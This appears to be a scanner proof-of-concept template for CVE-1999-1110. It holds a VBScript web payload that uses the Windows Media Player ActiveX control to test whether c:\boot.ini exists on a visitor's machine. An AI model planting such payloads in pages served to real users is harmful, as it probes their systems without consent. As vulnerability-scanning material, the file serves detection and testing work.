[info]
author = "AVE"
description = "通过 Windows Media Player ActiveX 控件检测本地文件是否存在"
id = "POC-AVE-1999-0951"
name = "CVE-1999-1110 PoC"
severity = "medium"
tags = ["cve-1999-1110"]
vuln_id = [
    "CVE-1999-1110",
    "AVE-1999-0951",
]

[poc]
logic = "all"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/cve-1999-1110.html"
protocol = "http"

[poc.requests.body]
content = '<html><body><script language="VBScript">Dim p:Set p=CreateObject("MediaPlayer.MediaPlayer.1"):On Error Resume Next:p.Open("c:\boot.ini"):If Err.Number=-2147221164 Then msg="FILE_NOT_EXIST" Else msg="FILE_EXIST":End If:document.write(msg)</script></body></html>'
type = "raw"

[[poc.requests.matchers]]
expect = true
status = [200]
type = "status"
